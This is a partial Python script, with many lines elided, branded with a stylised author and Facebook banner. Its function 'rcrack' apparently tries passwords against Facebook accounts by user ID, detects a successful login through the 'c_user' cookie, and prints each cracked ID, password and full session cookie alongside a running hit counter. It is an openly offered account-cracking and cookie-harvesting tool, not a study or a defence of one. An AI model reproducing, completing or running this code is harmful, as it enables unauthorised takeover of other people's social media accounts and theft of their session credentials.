...
◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
       ...
       ✓✓•    𝘼𝙐𝙏𝙃𝙀𝙍 ◆◆ 𝙈𝙐𝙆𝙏𝘼𝙍𝙐𝙕𝙕𝘼𝙈𝘼𝙉 𝙈𝙐𝙆𝙏𝘼𝙍 
    
       ✓✓•    𝙁𝘼𝘾𝙀𝙃𝙊𝙊𝙆 ◆◆ 𝙈𝙐𝙆𝙏𝘼𝙍𝙐𝙕𝙕𝘼𝙈𝘼𝙉 
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MUKTAR-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MUKTAR{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
